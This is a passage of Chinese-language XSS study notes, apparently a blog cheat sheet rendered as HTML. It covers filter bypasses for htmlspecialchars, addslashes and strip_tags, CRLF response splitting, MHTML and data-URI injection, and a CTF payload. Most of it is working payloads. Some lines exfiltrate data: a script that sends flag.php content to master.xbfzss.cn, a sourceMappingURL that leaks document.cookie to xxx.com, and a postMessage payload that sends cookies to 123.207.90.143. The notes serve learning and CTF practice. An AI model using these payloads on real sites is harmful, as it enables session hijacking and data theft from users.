</span><br><span class=\"line\">\t$str = strtolower(@$_POST[&quot;keyword&quot;]); </span><br><span class=\"line\">\t$str = preg_replace(&quot;/&lt;.*?&gt;/&quot;, &apos;&apos;, $str);</span><br><span class=\"line\">\techo &apos; &lt;form class=&quot;main&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt; &lt;input name=keyword size=60 value=&quot;&apos;.$str.&apos;&quot;&gt; &lt;input type=submit name=submit value=&quot;Search&quot;/&gt; &lt;/form&gt;&apos;; echo &apos;&lt;p class=&quot;main&quot;&gt;No results for &quot;&lt;b&gt;&apos;.htmlspecialchars($str).&apos;&lt;/b&gt;&quot;&lt;/p&gt;&apos;; ?</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; type=image src=x onerror=alert(1) &quot;</span><br><span class=\"line\">=&gt; &lt;input type=image src=x onerror=alert(1)&gt;</span><br><span class=\"line\">input会被当做img标签使用</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;/onfocus=alert`1`/&quot;             =&gt; 不会自动触发</span><br></pre></td></tr></table></figure>\n<h2 id=\"js中的连接符\"><a href=\"#js中的连接符\" class=\"headerlink\" title=\"js中的连接符\"></a>js中的连接符</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">\tini_set(&quot;display_errors&quot;, 0); </span><br><span class=\"line\">\t$name = $_GET[&quot;name&quot;]; </span><br><span class=\"line\">\techo &apos;&lt;h3 class=&quot;main&quot;&gt;No results for &quot;&lt;b&gt;&apos;; echo htmlspecialchars($name).&apos;&lt;/b&gt;&quot;&lt;/h3&gt;&apos;; echo &apos; &lt;script&gt; var t=&quot;&apos;.$name.&apos;&quot;; var s=&quot;xxxxxxxx&quot;; var d=&quot;dddd&quot;; &lt;/script&gt;&apos;; ?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里就是一个新的输出点了，你的值是输出在js代码中的 只要闭合双引号，然后就可以写你自己的js代码了 比如 &quot;-alert(1)-&quot; 赋值给url中的name即可 -是js中的连接符号</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">name=&quot;;alert(1);//</span><br></pre></td></tr></table></figure>\n<h2 id=\"危险字符\"><a href=\"#危险字符\" class=\"headerlink\" title=\"危险字符\"></a>危险字符</h2><table>\n<thead>\n<tr>\n<th>&lt;</th>\n<th>&amp;lt</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>&gt;</td>\n<td><figure class=\"highlight plain\"><figcaption><span>|</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">| &amp;    | ```&amp;amp;```  |</span><br><span class=\"line\">| &quot;    | ```&amp;quot;``` |</span><br><span class=\"line\">| &apos;    | ```&amp;#39```   |</span><br><span class=\"line\"></span><br><span class=\"line\">## Dom-Based XSS</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; document.URL</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; document.URLUencoded</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; document.location(.pathname|.href|.search|.hash)</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; window.location(.pathname|.href|.search|.hash)</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; document.referrer</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; window.name</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; document.cookie</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; HTML5 postMessage</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; localStorage/globalStorage</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; XMLHTTPRequest response</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; Input.value</span><br><span class=\"line\"></span><br><span class=\"line\">## htmlspecialchars可绕过情况</span><br></pre></td></tr></table></figure></td>\n</tr>\n</tbody>\n</table>\n<p>echo “<input type=\"\\\"text\\\"\" value=\"\" + htmlspecialchars($str) + \"\">Please input the t1 as parameter”;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>$str = ‘ onmouseover=alert(1) &gt; //<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">因为htmlspecialchars默认只过滤`&lt;`，`&gt;`, `&quot;`，`&amp;`,默认为`ENT_COMPAT`</span><br></pre></td></tr></table></figure></p>\n<p>ENT_COMPAT - 默认。仅编码双引号。<br>ENT_QUOTES - 编码双引号和单引号。<br>ENT_NOQUOTES - 不编码任何引号。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## addslashes</span><br></pre></td></tr></table></figure></p>\n<p>echo “<input type=\"\\\"text\\\"\" value=\"\" + addslashes($str) +\"\">Please input the t1 as parameter”;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">paylaod1:</span><br></pre></td></tr></table></figure></p>\n<p>$str = ‘ onmouseover=alert(1) //<br>=&gt; 源码:</p>\n<p>&lt;input type=”text” value=’\\’ onmouseover=alert(1) //‘&gt;Please input the t2 as parameter<br>=&gt; 浏览器处理结果:</p>\n<p><input value=\"\\\" onmouseover=\"alert(1)//'\" type=\"text\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">在火狐里边也能触发，如果去掉 `//` 则无法触发，应该是`//` 注释掉了后边的单引号，浏览器处理出现问题</span><br><span class=\"line\"></span><br><span class=\"line\">如果使用以上 payload,浏览器最终结果:</span><br></pre></td></tr></table></figure></p>\n<p><input value=\"\\\" onmouseover=\"alert(1)//'\" type=\"text\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">如果去掉`//`</span><br></pre></td></tr></table></figure></p>\n<p>$str = ‘ onmouseover=alert(1) //<br>=&gt; 源码:</p>\n<p>&lt;input type=”text” value=’\\’ onmouseover=alert(1)’&gt;Please input the t2 as parameter<br>=&gt; 浏览器处理结果：</p>\n<p>&lt;input type=”text” value=’\\’ onmouseover=alert(1)’&gt;Please input the t2 as parameter<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">这时候，就无法触发alert。</span><br><span class=\"line\"></span><br><span class=\"line\">paylaod2: </span><br><span class=\"line\"></span><br><span class=\"line\">这个payload只能在编码为gbk的情况下才能使用。</span><br></pre></td></tr></table></figure></p>\n<p><meta charset=\"gbk\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p> %df’&gt;<script>alert(1)</script> //<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## strip_tags绕过</span><br></pre></td></tr></table></figure></p>\n<p>echo ‘<input type=\"text\" value=\"' + strip_tags($str) +'\">Please input the t1 as parameter’;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">payload:</span><br></pre></td></tr></table></figure></p>\n<p>“ onmouseover=alert(1) //<br><code>`</code></p>\n","site":{"data":{}},"excerpt":"","more":"<p>link 标签引入外部 js。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">也可以用域名，将 . 用 。 代替。</span><br><span class=\"line\">&lt;link rel=<span class=\"keyword\">import</span> href=\\\\八进制ip</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">  xhr.open(<span class=\"string\">\"GET\"</span>, <span class=\"string\">\"https://router.vip/flag.php\"</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">  xhr.send();</span><br><span class=\"line\">  a=xhr.responseText;</span><br><span class=\"line\">  location.href=<span class=\"string\">'https://master.xbfzss.cn/?a='</span>+<span class=\"built_in\">escape</span>(a);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p>xss:<br>jquery版本&gt;=1.9<br>sourceMappingURL加载外部资源</p>\n<script>//# sourceMappingURL=https://xxx.com/?${escape(document.cookie)}</script>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input name=keyword  value=&quot;&lt;scrilpt&gt;alert(1);&lt;/script&gt;&quot;&gt;</span><br><span class=\"line\">payload:&quot; onmouseover=alert(1) &quot;</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot; onmouseover=alert(1) &quot;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input name=keyword  value=&apos;&apos;&gt;</span><br><span class=\"line\">payload:&apos; onmouseover=alert(1) &apos;</span><br><span class=\"line\">&lt;input name=keyword  value=&apos; onmouseover=alert(1) &apos;&apos;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input name=keyword  value=&quot;&quot;&gt;</span><br><span class=\"line\">过滤了on</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot; o_nclick=alert(1) &quot;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">payload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;as&lt;/a&gt;</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input name=keyword  value=&quot;&quot;&gt;</span><br><span class=\"line\">过滤了on</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot; o_nclick=alert(1) &quot;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">payload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;as&lt;/a&gt;</span><br><span class=\"line\">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>空格可以使用%0a，%0d绕过</p>\n<p>= onmouseover=alert`1`<br>alert(1)   两边的括号可以使用<code></code>替换</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">var call_window;</span><br><span class=\"line\">call_window = window.open(&quot;http://localhost/call.php&quot;);</span><br><span class=\"line\">setTimeout(function()&#123;</span><br><span class=\"line\">    call_window.postMessage(&#123;</span><br><span class=\"line\">      type: &quot;audio&quot;,</span><br><span class=\"line\">      details: &#123;</span><br><span class=\"line\">      sender_username: &quot;&lt;img src=xx: onerror=window.open(&apos;http://123.207.90.143/index.php?a=&apos;+document.cookie)&gt;&quot;,</span><br><span class=\"line\">        sender_team_name: &quot;zzzz&quot;,</span><br><span class=\"line\">        receiver_username: &quot;test&quot;,</span><br><span class=\"line\">        receiver_team_name: &quot;test&quot;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;, &quot;*&quot;);</span><br><span class=\"line\">&#125;, 1000);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"CRLF-注射攻击（HTTP-ResponseSplitting）-HRS\"><a href=\"#CRLF-注射攻击（HTTP-ResponseSplitting）-HRS\" class=\"headerlink\" title=\"CRLF 注射攻击（HTTP ResponseSplitting）(HRS)\"></a>CRLF 注射攻击（HTTP ResponseSplitting）(HRS)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nameValueCollection request = Request.QueryString;</span><br><span class=\"line\">Response.Cookies[&quot;username&quot;].Value = request[&quot;text&quot;]</span><br></pre></td></tr></table></figure>\n<p>正常访问:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/demo.aspx?text=test\" target=\"_blank\" rel=\"noopener\">http://www.test.com/demo.aspx?text=test</a></p>\n</blockquote>\n<p>正常情况下，会使用text=test来setcookie</p>\n<p>payload:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked\" target=\"_blank\" rel=\"noopener\">http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked</a></p>\n</blockquote>\n<p>正常情况下：HTTP Response如下:</p>\n<blockquote>\n<p>HTTP/1.1 200 OK</p>\n<p>Set-Cookie: userName=test</p>\n<p>Content-Type: text/html; charset-utf-8</p>\n</blockquote>\n<p>使用payload的情况下:</p>\n<blockquote>\n<p>HTTP/1.1 200 OK</p>\n<p>Set-Cookie: username=a</p>\n<p>Set-Cookie: HackedCookie=Hacked</p>\n<p>Content-Type: text/html; charset-utf8</p>\n</blockquote>\n<p>更严重的情况下:</p>\n<p>payload:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/page.php?page=%0d%0aContent-Type\" target=\"_blank\" rel=\"noopener\">http://www.test.com/page.php?page=%0d%0aContent-Type</a>: text/html%0D%0AHTTP/1.1 200 OK %0D%0AContent-Type: text/html%0D%0A%0D%0A%3Chtml%3EHacker Content%3C/html%3E</p>\n</blockquote>\n<p>该代码明显恶意，但是浏览器也会执行。</p>\n<h2 id=\"MHTML协议安全-IE浏览器\"><a href=\"#MHTML协议安全-IE浏览器\" class=\"headerlink\" title=\"MHTML协议安全[IE浏览器]\"></a>MHTML协议安全[IE浏览器]</h2><p>MHTML协议格式:</p>\n<blockquote>\n<p>mhtml: [Mhtml_File_Url]![Original_Resource_Url]</p>\n</blockquote>\n<p>新建一个HTML文件，demo.html</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: multipart/related; boundary=\"_boundary_by_mere\"</span><br><span class=\"line\"></span><br><span class=\"line\">--_boundary_by_mere</span><br><span class=\"line\">Cotent-Location: demo</span><br><span class=\"line\">Content-Transfer-Encoding: base64</span><br><span class=\"line\"></span><br><span class=\"line\">PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ=</span><br><span class=\"line\">--_boundary_by_mere--</span><br></pre></td></tr></table></figure>\n<p>当使用如下链接进行访问的时候，就会弹窗：</p>\n<blockquote>\n<p>mhtml:<a href=\"http://127.0.0.1/demo.html!demo\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/demo.html!demo</a></p>\n</blockquote>\n<p>注意:为了让IE调用MHTML Protocol Handler将该资源当做MHTML格式文件解析处理，需要把URL修改为MHTML协议，在”http”之前加上”mhtml:”，在url后边加上”!demo”字样。</p>\n<p>此外，还可以结合CRLF漏洞实现XSS。</p>\n<p>首先PHP脚本如下(test.php):</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $_GET[<span class=\"string\">'k'</span>];</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>构造url:</p>\n<blockquote>\n<p>mhtml:<a href=\"http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss</a></p>\n</blockquote>\n<h2 id=\"利用Data-URIs进行XSS\"><a href=\"#利用Data-URIs进行XSS\" class=\"headerlink\" title=\"利用Data URIs进行XSS\"></a>利用Data URIs进行XSS</h2><p>该方案和MHTML有些类似。Data URI格式如下:</p>\n<blockquote>\n<p> data:[<mime type=\"\">][;charset=<charset>][;base64],<encoded data=\"\"></encoded></charset></mime></p>\n</blockquote>\n<blockquote>\n<p>data指代URI协议</p>\n<p>mime type 代表数据类型，如PNG图片则为image/png,若无说明，默认为text/plain</p>\n<p>charset 如果不适用base64，则使用charset指定的字符类型</p>\n<p>encoded data 对应的编码信息</p>\n</blockquote>\n<p>例如:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"data:image/gif;base64,R0lGODlhMwAxAIAAAAAAAP///</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">yH5BAAAAAAALAAAAAAzADEAAAK8jI+pBr0PowytzotTtbm/DTqQ6C3hGX</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">ElcraA9jIr66ozVpM3nseUvYP1UEHF0FUUHkNJxhLZfEJNvol06tzwrgd</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">LbXsFZYmSMPnHLB+zNJFbq15+SOf50+6rG7lKOjwV1ibGdhHYRVYVJ9Wn</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">k2HWtLdIWMSH9lfyODZoZTb4xdnpxQSEF9oyOWIqp6gaI9pI1Qo7BijbF</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">ZkoaAtEeiiLeKn72xM7vMZofJy8zJys2UxsCT3kO229LH1tXAAAOw==\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>XSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，就没有办法使用了。</p>\n<blockquote>\n<p>\\&lt;a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+”>test\\&lt;/a></p>\n</blockquote>\n<p>其中:</p>\n<blockquote>\n<p>PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+</p>\n</blockquote>\n<p>解码后:</p>\n<blockquote>\n<p>\\&lt;script>alert(‘xss’);\\&lt;/script></p>\n</blockquote>\n<p>这种方法，现在不支持，同样不支持的还有<meta>标签，  chrome和firefox都会禁止。  </p>\n<blockquote>\n <meta http-equiv=\"Refresh\" content=\"0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\">\n</blockquote>\n<p><object>则可以使用,<iframe>也行。</p>\n<blockquote>\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></object>\n\n<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></iframe>\n</blockquote>\n<h2 id=\"simple-xss\"><a href=\"#simple-xss\" class=\"headerlink\" title=\"simple xss\"></a>simple xss</h2><p>XSS payload只允许使用大小写字母数字加上<code>&lt;^*~\\-|_=+</code>这些特殊符号，那么大概只有两种方案：</p>\n<ol>\n<li>利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作</li>\n<li>利用某些奇怪的HTML标签特性</li>\n</ol>\n<p>比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某<code>LC↯BC</code>队<a href=\"https://ctftime.org/writeup/5956\">https://ctftime.org/writeup/5956</a> 脑洞出来了个奇葩思路</p>\n<blockquote>\n<p>&lt;svg id=\\ onload=location=id+id+12345609861+domain+id+1234+id </p>\n</blockquote>\n<p>我们（nao）想（dong）出来的payload有如下几个关键点：</p>\n<ol>\n<li>Chrome会把域名中的<code>。</code>（全角句号）理解成<code>.</code></li>\n<li><code>&lt;link rel=import</code>这种标签会把html import到当前页面里….N年前玩polymer的时候常用的一种标签…这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行</li>\n<li><code>\\\\</code>会被Chrome理解成<code>//</code>，<code>\\</code>也会理解成<code>/</code> （其实这里有个小插曲，我Win10上的Chrome会把<code>\\\\</code>理解成windows资源管理器里敲的那种<code>\\\\</code>也就是samba协议(或<code>file://</code>伪协议)…所以这种payload XSS Windows貌似是不行…?）， 因此<code>\\\\example。com\\xssHtml</code>会变成<code>//example.com/xssHtml</code></li>\n</ol>\n<p>综上，payload:</p>\n<blockquote>\n<p>&lt;link rel=import href=\\example。com\\xssHtml other= </p>\n</blockquote>\n<h2 id=\"RSS中的XSS\"><a href=\"#RSS中的XSS\" class=\"headerlink\" title=\"RSS中的XSS\"></a>RSS中的XSS</h2><p>略</p>\n<h2 id=\"浏览器差异\"><a href=\"#浏览器差异\" class=\"headerlink\" title=\"浏览器差异\"></a>浏览器差异</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"undefined\">&lt;!--</span></span><br><span class=\"line\"><span class=\"xml\">    var x = \"xssed<span class=\"tag\">&lt;/<span class=\"name\">script</span> <span class=\"attr\">x</span>\\&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">x</span>\\&gt;</span><span class=\"javascript\">alert(<span class=\"regexp\">/xss/</span>);<span class=\"comment\">//\";</span></span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//--&gt;</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Chrome会动态修正一些节点，如将</script>修正为，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.</p>\n<h2 id=\"img编码绕过\"><a href=\"#img编码绕过\" class=\"headerlink\" title=\"img编码绕过\"></a>img编码绕过</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"j&amp;#00097vascript:alert('xss');\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\"j&amp;#97vascript:alert('xss1');\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">\" javascript:alert('xss3');\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"a绕过-javascript伪协议\"><a href=\"#a绕过-javascript伪协议\" class=\"headerlink\" title=\"a绕过,javascript伪协议\"></a>a绕过,javascript伪协议</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"body和div\"><a href=\"#body和div\" class=\"headerlink\" title=\"body和div\"></a>body和div</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;body onload=alert(1)&gt;&lt;&quot;</span><br><span class=\"line\">&quot;&gt;&lt;div onclick=&quot;alert(&apos;xss&apos;)&quot;&gt;click me&lt;&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤括号\"><a href=\"#过滤括号\" class=\"headerlink\" title=\"过滤括号\"></a>过滤括号</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    ini_set(<span 